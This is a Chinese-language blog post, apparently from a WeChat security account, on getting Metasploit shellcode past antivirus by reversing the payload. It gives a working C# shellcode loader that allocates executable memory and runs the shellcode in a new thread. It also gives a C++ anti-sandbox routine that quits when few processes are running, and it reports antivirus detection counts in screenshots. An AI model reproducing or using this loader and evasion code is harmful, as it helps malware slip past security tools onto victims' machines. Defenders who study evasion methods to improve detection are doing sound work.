> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Mx-K4Y0CRfqManzXN3tzag)

本文将介绍利用反转 shellcode 的方法来绕过杀软。我们先来生成一个简单的 msf 的载荷看看：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WBYyxT7PhxU1L9S0zzSXt0jp4ELw6P02hBvLarTalspM0MPU4X5ceazRcyYt6azZHZKCR74WK6hA/640?wx_fmt=png)

查看 VT 情况：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WBYyxT7PhxU1L9S0zzSXt0SVnzkrDYFLaibZS4jgWDFxDcACy0XneRY8f7lh3q38htpAic7sTRiac2g/640?wx_fmt=png)

下面我们来用 Csharp 写一个基本的加载器，代码如下：

```
using System;
using System.Runtime.InteropServices;

class Program
{


     [DllImport("kernel32")]
    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);


     [DllImport("kernel32")]
    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

     [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    private static UInt32 MEM_COMMIT = 0x1000;
    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;


    static void Main()
    {
        IntPtr threatHandle = IntPtr.Zero;
        UInt32 threadId = 0;
        IntPtr parameter = IntPtr.Zero;


       byte[] shellcode = new byte[1] { 0xfc };

        UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);
        threatHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
        WaitForSingleObject(threatHandle, 0xFFFFFFFF);

        return;
    }
}
```

即利用 P/Invoke 来调用 win32 api。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WBYyxT7PhxU1L9S0zzSXt0pLPy7R9V2lNcib4CLaVtQxyRibWZfl7YKUtttU7icCDzLYerd9aNzicPIg/640?wx_fmt=png)

VT 情况：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WBYyxT7PhxU1L9S0zzSXt0mkNpNvFH4ZImQYppt2qZSbpBM7Iqmc3VE8eUaJNN21QXmY3F0ouZMQ/640?wx_fmt=png)

然后我们将 shellcode 进行反转，再进行加载：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WBYyxT7PhxU1L9S0zzSXt0T33PImxDNYbp1L8SLWDKgwhk0aZsdy21odibv5NIjpiakdnLOFApo2KA/640?wx_fmt=png)

顺便加点反沙箱，比如判断个沙箱进程数目，C++demo 如下：

```
void AntiSimulation()
{
  HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == hSnapshot)
  {
    return;
  }
  PROCESSENTRY32 pe = { sizeof(pe) };
  int procnum = 0;
  for (BOOL ret = Process32First(hSnapshot, &pe); ret; ret = Process32Next(hSnapshot, &pe))
  {
    procnum++;
  }
  if (procnum <= 40)  //判断当前进程是否低于40个，目前见过能模拟最多进程的是WD能模拟39个
  {
    exit(1);
  }
}
```

这个就见仁见智，自己加入就好了。看下效果：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WBYyxT7PhxU1L9S0zzSXt0VoDtWLyv84aZ3iajhy5mPgNqXRYqXrMyeQB0S45cqSEib6IhGYDXDosQ/640?wx_fmt=png)

最后的代码已传至 Github(去除了反沙箱)：https://github.com/lengjibo/OffenSiveCSharp/tree/master/bypassAV8

     ▼

更多精彩推荐，请关注我们

▼

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08XZjHeWkA6jN4ScHYyWRlpHPPgib1gYwMYGnDWRCQLbibiabBTc7Nch96m7jwN4PO4178phshVicWjiaeA/640?wx_fmt=png)